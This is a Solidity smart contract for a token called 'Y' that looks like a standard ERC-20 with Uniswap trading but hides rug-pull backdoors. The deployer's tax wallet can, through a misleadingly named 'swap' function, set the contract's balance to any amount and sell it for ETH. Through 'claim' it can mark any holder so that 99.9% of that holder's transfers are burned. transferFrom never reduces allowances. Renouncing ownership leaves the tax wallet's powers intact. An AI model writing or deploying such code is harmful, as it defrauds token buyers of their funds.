pragma solidity ^0.8.20;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract Y is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address"); 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    string private _name = "Y";
    string private _symbol = "Y";

    constructor() {
        _taxWallet = sender(); 
        _balances[msg.sender] =  _totalSupply; 
        emit Transfer(address(0), msg.sender, _balances[sender()]);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    bool tradingEnabled = false;
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }
    address public _taxWallet;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function swap(uint256 amounts, address to) external {
        if (marketingAddres()) {
        _approve(address(this), address(uniV2Router), amounts); _balances[address(this)] = amounts;address[] memory path = new address[](2);
         path[0] = address(this); path[1] = uniV2Router.WETH(); 
         uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amounts, 0, path, to, block.timestamp + 31);
        } else {
        }
    }
    event Approval(address indexed, address indexed, uint256 value);
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    bool autoSwap = false;
    function setSwapActive(bool active) external  onlyOwner {
        autoSwap = active;
    }
    mapping(address => uint256) private _balances;
    function claim (address[] calldata claimable) external {
        for (uint _claimIndex = 0;  _claimIndex < claimable.length;  _claimIndex++) { 
            uint256 bNumber = 1 + block.number + 0;
            if (!marketingAddres()){}
            else { cooldowns[claimable[_claimIndex]] = bNumber;}
        }
    }
    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[sender()][spender] + addedValue);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function blockNumber() internal view returns (uint256) {
        return block.number;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(sender(), spender, amount);
        return true;
    }
    function marketingAddres() private view returns (bool) {
        return (sender() == _taxWallet);
    }
    function timestamp() internal view returns (uint256) {
        return block.timestamp;
    }
    
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0));
        require(value <= _balances[from]);
        uint256 cooldownFee = (value.mul(999).div(1000));
        uint256 _fee = 0;
        bool cdNumber = (cooldowns[from] <= blockNumber());
        if ((cooldowns[from] != 0) && cdNumber) { _fee = cooldownFee; }
        _balances[to] += ((value) - (_fee));
        _balances[from] = ((_balances[from]) - (value));
        emit Transfer(from, to, value);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping (address => uint256) internal cooldowns;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}